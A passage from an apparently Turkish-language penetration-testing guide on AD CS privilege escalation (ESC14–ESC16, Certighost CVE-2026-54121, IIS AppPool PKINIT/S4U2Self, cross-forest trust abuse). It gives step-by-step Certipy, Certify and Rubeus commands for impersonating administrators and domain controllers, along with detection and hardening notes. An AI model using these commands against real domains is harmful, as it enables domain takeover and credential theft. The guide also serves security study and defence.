- **Ön koşul**: Hedefin `altSecurityIdentities` içinde zayıf bir X509SubjectOnly açık eşlemesi vardır. Saldırgan, hedefin X509SubjectOnly eşlemesindeki subject ile eşleşmesi için bir kurban sorumlunun `cn` veya `dNSHostName` özniteliğini ayarlayabilir. Ardından saldırgan kurban olarak sertifika talep edebilir ve bu sertifikayı hedef olarak kimlik doğrulaması yapmak için kullanabilir.
### Somut işlemler
#### Senaryo A

`Machine` sertifika şablonundan bir sertifika talep edin

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Sertifikayı kaydet ve dönüştür

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Kimlik doğrula (sertifikayı kullanarak)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Temizleme (isteğe bağlı)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Daha fazla saldırı senaryosundaki belirli saldırı yöntemleri için lütfen şuraya bakın: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Açıklama

[Orijinal ESC15 araştırması](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc), V1 template için yapılan bir istekte sağlanan application policy'lerin, **yaması uygulanmamış bir issuing CA** üzerinde yapılandırılmış Extended Key Usage değerini nasıl geçersiz kılabileceğini açıklar.<sup>[[15]](#references)</sup> Ayrıca adayın, gerekli subject/request özelliklerine izin veren ve engelleyici bir onay veya imza koşulu bulunmayan, yayımlanmış ve enrollment'a açık bir template'e ihtiyacı vardır. Yalnızca enrollment haklarının olması, istismarın mümkün olduğunu kanıtlamaz. Certificate Request Agent kullanımı ayrıca uygun bir ikinci template'e ve enrollment-agent kısıtlamalarına bağlı olabilir; bu yolu kullanabileceğinizi öne sürmeden önce CA yama durumunu ve sertifikanın verilip verilmediğini doğrulayın.

### Kötüye Kullanım

[Certipy privilege-escalation belgeleri](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) daha ayrıntılı kullanım örnekleri içerir.<sup>[[14]](#references)</sup>


Certipy'nin `find` komutu, CA'ye yama uygulanmamışsa ESC15'e karşı potansiyel olarak savunmasız V1 template'leri belirlemeye yardımcı olabilir.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Senaryo A: Schannel üzerinden Doğrudan Kimliğe Bürünme

**Adım 1: "Client Authentication" Application Policy ve hedef UPN'yi enjekte ederek bir sertifika isteyin.** Saldırgan `attacker@corp.local`, kayıt yaptıran kişinin konu bilgisi sağlamasına izin veren "WebServer" V1 şablonunu kullanarak `administrator@corp.local` hesabını hedef alır.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: "Enrollee supplies subject" ayarına sahip, güvenlik açığı bulunan V1 template.
- `-application-policies 'Client Authentication'`: CSR'nin Application Policies uzantısına `1.3.6.1.5.5.7.3.2` OID'sini ekler.
- `-upn 'administrator@corp.local'`: Taklit için SAN'de UPN'yi ayarlar.

**Adım 2: Elde edilen sertifikayı kullanarak Schannel (LDAPS) üzerinden kimlik doğrulaması yapın.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Senaryo B: Enrollment Agent Abuse yoluyla PKINIT/Kerberos Impersonation

**Adım 1: "Enrollee supplies subject" özelliğine sahip bir V1 template üzerinden, "Certificate Request Agent" Application Policy enjekte ederek sertifika isteyin.** Bu sertifika, saldırganın (`attacker@corp.local`) enrollment agent olmasını sağlar. Amaç agent yeteneğini elde etmek olduğundan, saldırganın kendi kimliği için burada UPN belirtilmez.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` değerini ekler.

**Adım 2: Hedef ayrıcalıklı kullanıcı adına sertifika istemek için "agent" sertifikasını kullanın.** Bu, 1. Adım’daki sertifikanın agent sertifikası olarak kullanıldığı ESC3 benzeri bir adımdır.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulaması yapın.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## CA'de Güvenlik Uzantısı Devre Dışı (Genel)-ESC16

### Açıklama

**ESC16 (szOID_NTDS_CA_SECURITY_EXT Uzantısının Eksik Olması Yoluyla Yetki Yükseltme)**, **szOID_NTDS_CA_SECURITY_EXT** SID uzantısının CA genelinde devre dışı bırakılmasını ifade eder. Bu, bir yapılandırma göstergesidir; bir sertifikanın başka bir hesap olarak kimlik doğrulayabildiğinin kanıtı değildir. Başka bir hesabı taklit etmek için ilgili hesap özniteliklerinin veya eşlemenin denetlenmesi, istemci kimlik doğrulaması sağlayan bir şablonda sertifika kaydı yapılabilmesi ve gerçek etki alanı denetleyicisi ya da hizmetin kabul ettiği bir sertifika eşleme yolunun bulunması da gerekir. Full Enforcement modundaki yamalı bir KDC, başka bir güçlü eşlemesi olmayan SID uzantısız sertifikaları reddeder; aşağıdaki yalnızca UPN kullanan Kerberos prosedürü, zayıf eşlemeyi hâlâ kabul eden eski veya uyumluluk modundaki KDC'ler için geçerlidir. [Microsoft'un sertifika eşleme ve zorlama kılavuzuna](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) bakın.

Ayrıca ayrıntılı ilke hakkında daha fazla bilgi edinmek için şu makaleye başvurabilirsiniz:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### İstismar

Aşağıdaki yalnızca UPN kullanan tarihsel Kerberos örneği, [Certipy'nin ESC16 belgelerine](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) dayanmaktadır. Sonuçta ortaya çıkan zayıf eşlemeyi hâlâ kabul eden bir KDC gerektirir; `StrongCertificateBindingEnforcement=1`, 9 Eylül 2025 tarihli Windows güvenlik güncellemesinden sonra artık desteklenen bir geçersiz kılma seçeneği değildir.<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) ortamının **ESC16**'ya karşı savunmasız olup olmadığını belirlemek için.

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Adım 1: Kurban hesabının başlangıç UPN değerini oku (İsteğe bağlı - geri yükleme için).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Adım 2: Kurban hesabının UPN'sini hedef yöneticinin `sAMAccountName` değeriyle güncelleyin.  **  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Adım 3: ("Kurban" hesabının kimlik bilgilerini (gerekirse) elde edin (ör. Shadow Credentials aracılığıyla).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Adım 4: ESC16 yapılandırılmış CA üzerinde, hesabın kayıt olabileceği bir client-authentication şablonundan (ör. "User") "victim" kullanıcı olarak sertifika isteyin.** CA, verilen sertifikadan SID security extension'ı çıkarır; ancak bu tek başına kullanılabilir bir kimlik doğrulama eşlemesi oluşturmaz. Kerberos credential cache ortam değişkenini ayarlayın (shell komutu):

```bash
export KRB5CCNAME=victim.ccache
```

Ardından sertifikayı talep edin:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Adım 5: "victim" hesabının UPN'sini eski haline döndürün.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**6. Adım: Bu zayıf eşlemeyi kabul eden eski veya uyumluluk modundaki bir KDC'de hedef yönetici olarak kimlik doğrulayın.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Açıklama

**Certighost**, CA'nın verilen sertifikaya yerleştirilecek kimliği belirlemek için isteği gönderen tarafından sağlanan istek özniteliklerine güvendiği bir **AD CS enrollment chase / callback path**'ini kötüye kullanır. Herkese açık PoC'de hazırlanan istek şunları içerir:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA'nın bağlantı kuracağı, saldırganın kontrolündeki ana bilgisayar/IP
- **`rmd`**: kimliğine bürünülecek **hedef Domain Controller DNS adı**

CA bu chase'i izlerse, **SMB/LSA (`445`)** ve **LDAP (`389`)** üzerinden saldırgana bağlanır. Saldırgan, callback oturumunun geçerli bir domain principal olarak kimlik doğrulaması yapması için **gerçek bir makine hesabı** (genellikle varsayılan **`ms-DS-MachineAccountQuota`** kullanılarak oluşturulur) kullanır; ancak sahte servisler bunun yerine **hedef DC'nin** kimlik özniteliklerini döndürür:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA, **döndürülen kimliği kimliği doğrulanmış callback principal'a kriptografik olarak bağlamazsa**, oturum saldırganın kontrolündeki makine hesabı olarak kimlik doğrulaması yapmış olsa bile **Domain Controller** için sertifika verebilir. Bu hata kavramsal olarak **Certifried**'den farklıdır: saldırgan, `dNSHostName` gibi AD özniteliklerini yeniden yazmak yerine **CA callback çözümlemesi sırasında kimlik verilerini değiştirir**.<sup>[[2]](#references)</sup>

**Gerekli koşullar:**

- Düşük ayrıcalıklı **domain kimlik bilgileri**
- Bir bilgisayar hesabı **oluşturma veya yeniden kullanma** olanağı
- **CA** ile saldırganın kontrolündeki `389` ve `445` numaralı **portlar** arasında ağ erişimi
- Savunmasız / yamalanmamış CA istek yolu (**14 Temmuz 2026** tarihli Microsoft güncellemesi, **`cdc` için DC doğrulaması** ve **çözümlenen SID karşılaştırması** ekledi)

Elde edilen **`.pfx`**, ardından **PKINIT** için kullanılabilir; bu işlem bir **`.ccache`** ve yayımlanmış PoC akışında **hedef DC'nin NT hash'ini** üretir. Bu hash normalde **domain'in tamamen ele geçirilmesi** için yeterlidir.

### Kötüye kullanım

Herkese açık PoC tüm zinciri otomatikleştirir:<sup>[[1]](#references)</sup>

1. Saldırganın kontrolündeki bir **makine hesabı** oluşturun veya yeniden kullanın.
2. `389` ve `445` portlarında **sahte LDAP ve SMB/LSA listener'ları** başlatın.
3. Saldırganın kontrolündeki **`cdc`** ve hedef **`rmd`** özniteliklerini içeren bir sertifika isteği gönderin.
4. CA'nın, kontrol edilen makine hesabı olarak sahte listener'larda kimlik doğrulaması yapmasını sağlayın; kimlik sorgularını ise **hedef DC'nin** öznitelikleriyle yanıtlayın.
5. CA tarafından imzalanmış bir **DC sertifikası** alın ve bunu **PKINIT** için kullanın.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

PoC için kullanışlı çalışma zamanı bayrakları:

- `--listener <ip>`: `cdc` içinde duyurulan callback IP'sini açıkça seçer
- `--computer-name <NAME$>`: yeni bir tane oluşturmak yerine mevcut bir makine hesabını yeniden kullanır

**Operasyonel notlar:**

- PoC, **ayrıcalıklı** `389` ve `445` portlarına bağlandığı için **root** gerektirir.
- Başarılı exploitation, yerel olarak bir **DC `.pfx`** ve bir **Kerberos `.ccache`** dosyası yazar.
- Sertifika bir **Domain Controller hesabına** eşleştiğinden, sonraki işlemler arasında **sertifika tabanlı Kerberos auth**, **DCSync** ve kurtarılan **makine NT hash'inin** yeniden kullanılması yer alabilir.<sup>[[2]](#references)</sup>

## IIS AppPool makine kaydıyla aynı host'ta Administrator olma

`ApplicationPoolIdentity` olarak çalışan bir IIS pool, ağ kaynaklarına giden erişimde host'un **computer account** hesabını kullanır. Bu nedenle `IIS AppPool\<POOL>` olarak code execution, yerel token'da düşük ayrıcalıklı kalırken CA'nın `HOST$` olarak doğruladığı bir AD CS isteği gönderebilir; bu, token impersonation veya Potato tarzı yerel privilege escalation değil, giden kimlik geçişidir.<sup>[[19]](#references)[[20]](#references)</sup>

Bu zincir; domain'e katılmış bir IIS host, RPC üzerinden erişilebilen bir Enterprise CA, bilgisayarın enrollment hakkına sahip olduğu yayımlanmış bir makine kimlik doğrulama şablonu, PKINIT desteği ve KDC/SMB erişilebilirliği gerektirir. Özel bir pool identity, giden principal'ı değiştirdiğinden `HOST$` olduğunu varsaymadan önce pool'un gerçekten `ApplicationPoolIdentity` kullandığını doğrulayın.<sup>[[19]](#references)[[20]](#references)</sup>

### Saldırganın kontrolündeki anahtarla kayıt

Anahtar çiftini ve CSR'ı IIS sunucusunun dışında oluşturun ve private key'i saklayın. Ele geçirilmiş worker'dan **yalnızca CSR'ı** gönderin. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx), `CertificateAuthority.Request` örneğini oluşturur, `CertificateTemplate:Machine` ayarını yapar, `ICertRequest::Submit` çağrısını yapar ve verilen sertifikayı döndürür. CA yapılandırma dizesi olarak `CAHOST\CA-NAME` kullanın; standart bir `Machine` şablonu subject'i AD'den oluşturduğundan, isteği gönderenin sağladığı subject/SAN verileri gerekmez.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Döndürülen sertifikayı **eşleşen ve saklanan anahtarla** birleştirin. `certutil -MergePFX machine_cert.cer machine_cert.pfx` komutu yalnızca Windows sertifikayı erişilebilir bir private key ile zaten ilişkilendirebiliyorsa çalışır; ayrı PEM dosyaları için PKCS#12'yi açıkça oluşturun:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

PFX'i PKINIT için kullanın ve döndürülen computer TGT'yi hemen enjekte etmek yerine base64 olarak saklayın:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self artı aynı ana makinede hizmet ikamesi

S4U2Self, bir hizmetin başka bir kullanıcının yetkilendirme verilerini içeren, **kendisine** yönelik bir ticket almasını sağlar. Bilgisayar TGT’siyle Rubeus, ayrıcalıklı bir kullanıcı için bu ticket’ı isteyebilir, döndürülen KRB-CRED içindeki hizmet adını CIFS olarak değiştirebilir ve ticket’ı enjekte edebilir. Bu, yerel “delegate to thyself” primitive’idir: S4U2Proxy veya bir `msDS-AllowedToDelegateTo` girdisi gerektirmez.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Değiştirilmiş ticket yalnızca **aynı bilgisayar hesabına/anahtarına** ait servisler tarafından kullanılabilir (burada, `HOST` üzerindeki CIFS). Bu, diğer domain makinelerinde kullanılabilen yeniden kullanılabilir bir Administrator ticket değildir. Ayrıca gösterilen sonuç, Administrator olarak ayrıcalıklı SMB/dosya sistemi erişimidir; yerel bir `NT AUTHORITY\SYSTEM` süreci elde etmek için ayrıca uzaktan çalıştırma adımı gerekir.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Tespit ve sağlamlaştırma

- CA üzerinde, IIS sunucu hesaplarının beklenmedik `Machine` template istekleri için Certification Services **4886** (istek alındı) ve **4887** (verildi) olaylarını ilişkilendirin.<sup>[[19]](#references)[[24]](#references)</sup>
- DC’lerde, sertifika ön kimlik doğrulaması kullanıldığında **4768** olayı sertifika alanlarını içerir; web sunucusu hesapları için olağandışı PKINIT TGT isteklerine yönelik uyarılar oluşturun. Ardından ayrıcalıklı bir taklit edilen kimliği ve aynı host’u içeren **4769** isteklerini inceleyin. Rubeus `/altservice` KRB-CRED servis adını istemci tarafında yeniden yazdığı için, DC tarafındaki 4769 servis adının `cifs` olmasını şart koşmayın.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe` işleminin CA RPC uç noktalarına erişmesini, beklenmedik ASPX dosyalarının oluşturulmasını, Kerberos kimlik doğrulamalı yönetim paylaşımlarına erişimi ve sır dökme etkinliklerini araştırın. Mümkün olduğunda uygulama katmanının CA RPC/KDC/SMB erişimini kısıtlayın ve operasyonel olarak gerekli olmayan bilgisayar kayıt izinlerini veya makine kimlik doğrulama template’lerini kaldırın.<sup>[[19]](#references)</sup>

## Pasif Çatıyla Açıklanan Sertifikalar Kullanılarak Forest’ların Ele Geçirilmesi

### Ele Geçirilmiş CA’lar Tarafından Forest Trust’larının Kırılması

**Forest’lar arası kayıt** yapılandırması nispeten kolay hâle getirilmiştir. Kaynak forest’taki **root CA sertifikası**, yöneticiler tarafından **hesap forest’larına yayımlanır** ve kaynak forest’taki **enterprise CA** sertifikaları, her hesap forest’ındaki **`NTAuthCertificates` ve AIA kapsayıcılarına eklenir**. Açıklamak gerekirse, bu düzenleme, kaynak forest’taki **CA’ya PKI’sini yönettiği diğer tüm forest’lar üzerinde tam kontrol sağlar**. Bu CA’nın **saldırganlar tarafından ele geçirilmesi durumunda**, hem kaynak hem de hesap forest’larındaki tüm kullanıcılar için sertifikalar **saldırganlar tarafından taklit edilebilir** ve böylece forest’ın güvenlik sınırı aşılabilir.<sup>[[6]](#references)</sup>

### Yabancı Principal’lara Verilen Kayıt Ayrıcalıkları

Çoklu forest ortamlarında, **Authenticated Users veya yabancı principal’lara** (Enterprise CA’nın bulunduğu forest dışındaki kullanıcılar/gruplar) **kayıt ve düzenleme hakları** tanıyan sertifika template’leri **yayımlayan** Enterprise CA’lara karşı dikkatli olunmalıdır.\
Bir trust üzerinden kimlik doğrulaması yapıldığında, AD kullanıcının token’ına **Authenticated Users SID’sini** ekler. Dolayısıyla, bir domain’de **Authenticated Users’a kayıt hakları tanıyan** bir template’e sahip Enterprise CA varsa, farklı bir forest’tan bir kullanıcı bu template’e **kayıt yaptırabilir**. Benzer şekilde, bir template aracılığıyla **yabancı bir principal’a açıkça kayıt hakları verilirse**, böylece **forest’lar arasında bir erişim kontrolü ilişkisi oluşturulur** ve bir forest’taki principal’ın başka bir forest’taki template’e **kayıt yaptırması** mümkün olur.

Her iki senaryo da forest’lar arasındaki **saldırı yüzeyini genişletir**. Bir saldırgan, yabancı bir domain’de ek ayrıcalıklar elde etmek için sertifika template’inin ayarlarından yararlanabilir.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC deposu](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost teknik analizi](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services’in Kötüye Kullanılması](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Yeni Kimlik Doğrulama ve İstek Yöntemleri ve Daha Fazlası](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Hesap Ele Geçirme için Key Trust Hesap Eşlemesinin Kötüye Kullanılması](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Gelişmiş Anahtarın (Yanlış) Kullanımı Öyküsü](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC Üzerinden AD Certificate Services’e Relay](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM ile ADCS CA’ya Shell Erişimi](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Kötüye Kullanım Tekniği](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Kötüye Kullanım Tekniği](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Ayrıcalık Yükseltme (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Sıradan Bir Başka AD CS ESC Değil](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Yanlış Yapılandırma ve İstismar](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself” Konusunu Yeniden Ele Almak](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS kayıt PoC’si](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Uç Noktası Üzerinden IIS AppPool’dan Ayrıcalık Yükseltme](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Uygulama Havuzu Kimlikleri](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 komutu](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Certification Services Denetimi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Olay 4768: Kerberos kimlik doğrulama ticket’ı istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Olay 4769: Kerberos servis ticket’ı istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell istismar araç seti](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
